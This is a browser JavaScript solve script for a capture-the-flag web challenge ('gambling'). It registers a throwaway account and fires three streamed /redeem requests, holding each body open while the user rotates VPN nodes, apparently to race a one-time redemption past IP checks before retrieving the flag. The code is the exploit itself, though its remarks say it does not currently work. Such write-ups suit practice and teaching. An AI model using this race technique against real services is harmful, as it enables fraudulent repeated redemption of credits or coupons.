// REMARKS:
// This is a *theoretical* solve for gambling that runs entirely in your browser.
// It only works on Chrome, which is currently the only browser that supports request body streaming.
// However, it currently doesn't work, since Chrome seems to fail to keep its h3 cache on reloads.
// This script may be easier to understand than src/solve.rs. However, this does not work out-of-the-box (unlike src/solve.rs).
// Minor modification of this script is likely necessary

// simple sleep helper
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// turn your payload into a Uint8Array once
const encoder = new TextEncoder();
const payloadStr = JSON.stringify(
    'eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/'
);
const payloadBytes = encoder.encode(payloadStr);

async function main() {
    const baseUrl = 'https://gambling.challs.umdctf.io';
    const username = crypto.randomUUID();
    const password = crypto.randomUUID();
    const authHeader = JSON.stringify({ username, password });

    // 1) register
    {
        const res = await fetch(`${baseUrl}/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
        });
        if (!res.ok) throw new Error(`register failed ${res.status}`);
        console.log('✅ Registered:', username);
    }

    // 2) redeem 3×, streaming payload + sleep-before-close
    for (let i = 1; i <= 3; i++) {
        // build a fresh ReadableStream each time
        const bodyStream = new ReadableStream({
            start(controller) {
                // send the one chunk
                controller.enqueue(payloadBytes);

                if (i !== 1) {
                    console.log(`🔄 CONNECT TO NEW VPN NODE for redeem #${i}`);
                    setTimeout(() => controller.close(), 10_000);
                } else {
                    // first iteration: finish immediately
                    controller.close();
                }
            }
        });

        // fire the fetch with our streaming body
        const res = await fetch(`${baseUrl}/redeem`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': authHeader,
            },
            duplex: 'half',
            body: bodyStream
        });
        console.log(`➡️ Redeem #${i} → HTTP ${res.status}`);

        if (i !== 1) {
            console.log(`🔄 DISCONNECT FROM VPN NODE after redeem #${i}`);
            await sleep(10_000);
        }
    }

    // 3) fetch the flag
    console.log('\n🏁 Fetching /flag…');
    const flagRes = await fetch(`${baseUrl}/flag`, {
        method: 'POST',
        headers: { 'Authorization': authHeader },
    });
    if (!flagRes.ok) throw new Error(`flag failed ${flagRes.status}`);
    const flagText = await flagRes.text();
    console.log('🎉 FLAG:', flagText.trim());
}

main().catch(err => console.error(err));
